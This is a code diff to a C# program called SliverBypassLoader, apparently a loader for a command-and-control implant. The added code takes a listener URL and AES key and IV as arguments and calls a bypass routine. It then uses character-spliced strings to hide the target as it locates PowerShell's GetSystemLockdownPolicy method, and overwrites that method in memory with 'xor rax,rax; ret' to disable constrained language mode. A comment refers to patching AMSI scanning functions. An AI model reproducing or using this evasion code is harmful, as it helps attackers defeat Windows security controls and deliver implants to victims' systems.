@@ -138,7 +138,43 @@ namespace SliverBypassLoader
         private static UInt32 MEM_COMMIT = 0x1000;
         public static void Main(string[] args)
         {
+            // Parse args
+            string listenerUrl = "", compressAlgorithm = "", targetBinary = "", aesKey = "", aesIv = "";
+            if (args != null && 
+                args.Length > 0 && 
+                !string.IsNullOrEmpty(args[0]) && 
+                !string.IsNullOrEmpty(args[1]) && 
+                !string.IsNullOrEmpty(args[2]) && 
+                !string.IsNullOrEmpty(args[3]) && 
+                !string.IsNullOrEmpty(args[4]))
+            {
+                listenerUrl = args[0];
+                compressAlgorithm = args[1];
+                targetBinary = args[2];
+                aesKey = args[3];
+                aesIv = args[4];
+            }
 
+            Bypass();
+
+            Char a1, a2, a3, a4, a5;
+            a1 = 'y';
+            a2 = 'g';
+            a3 = 'u';
+            a4 = 'o';
+            a5 = 't';
+            var Automation = typeof(System.Management.Automation.Alignment).Assembly;
+            // Get ptr to System.Management.AutomationSecurity.SystemPolicy.GetSystemLockdownPolicy
+            var get_l_info = Automation.GetType("S" + a1 + "stem.Mana" + a2 + "ement.Au" + a5 + "oma" + a5 + "ion.Sec" + a3 + "rity.S" + a1 + "stemP" + a4 + "licy").GetMethod("GetS" + a1 + "stemL" + a4 + "ckdownP" + a4 + "licy", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static);
+            var get_l_handle = get_l_info.MethodHandle;
+            uint lpflOldProtect;
+            RuntimeHelpers.PrepareMethod(get_l_handle);
+            var get_l_ptr = get_l_handle.GetFunctionPointer();
+
+            // make the System.Management.AutomationSecurity.SystemPolicy.GetSystemLockdownPolicy VM Page writable & overwrite the first 4 bytes
+            VirtualProtect(get_l_ptr, new UIntPtr(4), 0x40, out lpflOldProtect);
+            var new_instr = new byte[] { 0x48, 0x31, 0xc0, 0xc3 };
+            Marshal.Copy(new_instr, 0, get_l_ptr, 4);
         }
 
         // Dynamically search for and patch AmsiScanBuffer and AmsiScanString
